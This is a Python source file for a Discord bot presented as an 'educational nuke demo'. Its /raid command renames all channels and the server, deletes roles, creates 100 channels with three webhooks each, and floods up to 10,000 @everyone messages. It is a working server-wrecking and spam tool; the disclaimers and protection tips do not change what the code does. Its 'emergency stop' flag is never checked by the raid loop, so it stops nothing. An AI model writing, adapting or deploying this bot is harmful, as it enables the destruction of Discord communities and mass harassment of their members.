import discord
from discord.ext import commands
import asyncio
import os

# ========== CONFIGURATION ==========
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID = 1088143400496279552

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

active_demo = {}

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ FAST Educational Demo Bot ready - {bot.user}")

@bot.tree.command(name="raid", description="[OWNER ONLY] Educational nuke demo")
async def raid(
    interaction: discord.Interaction,
    message: str = "⚠️ THIS SERVER HAS BEEN NUKED ⚠️",
    ping: str = "yes",
    amount: int = 5000
):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can run this.", ephemeral=True)
    
    if not interaction.guild.me.guild_permissions.administrator:
        return await interaction.response.send_message("❌ Bot needs Administrator permission.", ephemeral=True)
    
    await interaction.response.send_message(f"⚡ **EDUCATIONAL NUKE DEMO STARTING**\nSending {amount} messages...", ephemeral=False)
    
    ping_enabled = ping.lower() in ['yes', 'y', 'true', '1']
    msg_amount = min(amount, 10000)
    ping_text = "@everyone " if ping_enabled else ""
    
    guild = interaction.guild
    active_demo[guild.id] = True
    
    # Create log channel
    log_channel = await guild.create_text_channel("🔴-NUKED-BY-DEMO")
    await log_channel.send("💀 **EDUCATIONAL NUKE DEMO** 💀")
    
    try:
        # ========== PARALLEL CHANNEL RENAMING ==========
        await log_channel.send("📢 Renaming all channels...")
        rename_tasks = [channel.edit(name="nuked-by-demo") for channel in guild.channels if channel != log_channel]
        await asyncio.gather(*rename_tasks, return_exceptions=True)
        
        # ========== SERVER RENAME ==========
        await guild.edit(name="🔥 NUKED BY DEMO 🔥")
        
        # ========== PARALLEL ROLE DELETION ==========
        await log_channel.send("📢 Destroying roles...")
        delete_tasks = [role.delete() for role in guild.roles if not role.is_default() and not role.managed and role != guild.me.top_role]
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        # ========== CREATE CHANNELS ==========
        await log_channel.send("📢 Creating 100 channels...")
        
        CHANNEL_COUNT = 100
        
        create_tasks = [guild.create_text_channel(f"nuked-{i}") for i in range(CHANNEL_COUNT)]
        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
        spam_channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
        
        await log_channel.send(f"✅ Created {len(spam_channels)} channels")
        
        # ========== CREATE WEBHOOKS (with retry logic) ==========
        await log_channel.send(f"📢 Creating webhooks for {len(spam_channels)} channels...")
        
        all_webhooks = []
        for channel in spam_channels:
            try:
                # Create 3 webhooks per channel
                for w in range(3):
                    try:
                        wh = await channel.create_webhook(name=f"spammer_{w}")
                        all_webhooks.append(wh)
                        await asyncio.sleep(0.05)  # Small delay to avoid rate limits
                    except:
                        pass
            except:
                pass
        
        await log_channel.send(f"✅ Created {len(all_webhooks)} webhooks")
        
        # ========== SPAM VIA WEBHOOKS (FASTEST METHOD) ==========
        await log_channel.send(f"⚡ Spamming {msg_amount} messages via webhooks...")
        
        messages_sent = 0
        
        # Prepare messages
        messages_list = [f"{ping_text}{message} [{i+1}/{msg_amount}]" for i in range(msg_amount)]
        
        # Spam using webhooks (10 messages per webhook per batch)
        async def spam_webhook(webhook, msgs):
            try:
                for msg in msgs:
                    await webhook.send(msg)
            except:
                pass
        
        # Distribute messages across webhooks
        if all_webhooks:
            msgs_per_webhook = max(1, msg_amount // len(all_webhooks))
            webhook_tasks = []
            
            for idx, webhook in enumerate(all_webhooks):
                start = idx * msgs_per_webhook
                end = min(start + msgs_per_webhook, msg_amount)
                if start < msg_amount:
                    webhook_tasks.append(spam_webhook(webhook, messages_list[start:end]))
            
            await asyncio.gather(*webhook_tasks, return_exceptions=True)
            messages_sent = msg_amount
        
        # If not enough webhooks, spam via channels too
        if messages_sent < msg_amount and spam_channels:
            remaining = msg_amount - messages_sent
            msgs_per_channel = max(1, remaining // len(spam_channels))
            
            channel_tasks = []
            for idx, channel in enumerate(spam_channels):
                start = idx * msgs_per_channel
                end = min(start + msgs_per_channel, remaining)
                if start < remaining:
                    async def channel_spam(ch, msgs):
                        try:
                            for msg in msgs:
                                await ch.send(msg)
                        except:
                            pass
                    channel_tasks.append(channel_spam(channel, messages_list[start:end]))
            
            await asyncio.gather(*channel_tasks, return_exceptions=True)
            messages_sent = remaining
        
        await log_channel.send(f"✅ Sent {messages_sent} messages!")
        
        # ========== ALSO SPAM IN LOG CHANNEL ==========
        for i in range(min(100, msg_amount // 10)):
            await log_channel.send(f"{ping_text}{message} [BONUS {i+1}]")
        
        # ========== FINAL SUMMARY ==========
        embed = discord.Embed(
            title="💀 EDUCATIONAL NUKE DEMO COMPLETE 💀",
            description=f"**What just happened:**\n\n"
                       f"⚡ **Channels Renamed** - All original channels wiped\n"
                       f"⚡ **Server Renamed** - Name changed\n"
                       f"⚡ **Roles Destroyed** - All protections removed\n"
                       f"⚡ **{len(spam_channels)} Spam Channels** - Created\n"
                       f"⚡ **{len(all_webhooks)} Webhooks** - Created\n"
                       f"⚡ **{messages_sent} Spam Messages** - Sent via webhooks\n"
                       f"⚡ **@everyone Pings** - {'ENABLED' if ping_enabled else 'DISABLED'}\n\n"
                       f"**🚨 HOW TO PROTECT YOUR SERVER:**\n"
                       f"• NEVER give Administrator to untrusted bots\n"
                       f"• Use 2FA on all admin accounts\n"
                       f"• Set verification level to HIGH\n"
                       f"• Use backup bots (Xenon) to save server structure\n"
                       f"• Audit bot permissions weekly\n\n"
                       f"**⚠️ This was an EDUCATIONAL DEMO**\n"
                       f"Delete this test server to clean up.",
            color=discord.Color.red()
        )
        await log_channel.send(embed=embed)
        
        # DM owner
        try:
            owner = await bot.fetch_user(OWNER_ID)
            await owner.send(embed=embed)
        except:
            pass
        
    except Exception as e:
        await log_channel.send(f"❌ Error: {e}")
    finally:
        active_demo[guild.id] = False

@bot.tree.command(name="stopraid", description="[OWNER ONLY] Emergency stop")
async def stopraid(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can stop the demo.", ephemeral=True)
    
    if interaction.guild.id in active_demo:
        active_demo[interaction.guild.id] = False
        await interaction.response.send_message("🛑 **Educational demo stopped**", ephemeral=False)
    else:
        await interaction.response.send_message("No active demo.", ephemeral=True)

@bot.tree.command(name="protect", description="How to protect your server")
async def protect(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🛡️ How to Protect Your Server from Nuke Bots",
        description="Educational security guide",
        color=discord.Color.green()
    )
    embed.add_field(name="1. NEVER give Admin to untrusted bots", 
                    value="Review permissions before inviting any bot.", inline=False)
    embed.add_field(name="2. Enable 2FA", 
                    value="All administrator accounts must have 2FA.", inline=False)
    embed.add_field(name="3. Server Verification Level", 
                    value="Set to HIGH (member must be registered for 10+ minutes).", inline=False)
    embed.add_field(name="4. Use Backup Bots", 
                    value="Xenon can save/restore your entire server structure.", inline=False)
    embed.add_field(name="5. Audit Logs", 
                    value="Check audit logs regularly for mass channel creation.", inline=False)
    embed.set_footer(text="Educational purposes only - Stay safe!")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

@bot.tree.command(name="commands", description="Show all commands")
async def cmd_list(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Educational Nuke Demo Bot",
        description="Demonstrates how nuke bots work for educational purposes",
        color=discord.Color.blue()
    )
    embed.add_field(name="/raid [message] [ping] [amount]", 
                    value="Start nuke demonstration\n"
                          "• Creates spam channels\n"
                          "• Creates webhooks\n"
                          "• Spams messages via webhooks\n"
                          "• Shows why you should NEVER give Admin to untrusted bots", 
                    inline=False)
    embed.add_field(name="/stopraid", value="Emergency stop", inline=False)
    embed.add_field(name="/protect", value="Show protection guide", inline=False)
    embed.add_field(name="/commands", value="Show this help", inline=False)
    embed.set_footer(text="⚠️ EDUCATIONAL ONLY - Run on test servers")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

if __name__ == "__main__":
    if not TOKEN:
        print("ERROR: DISCORD_TOKEN not set")
        exit(1)
    bot.run(TOKEN)
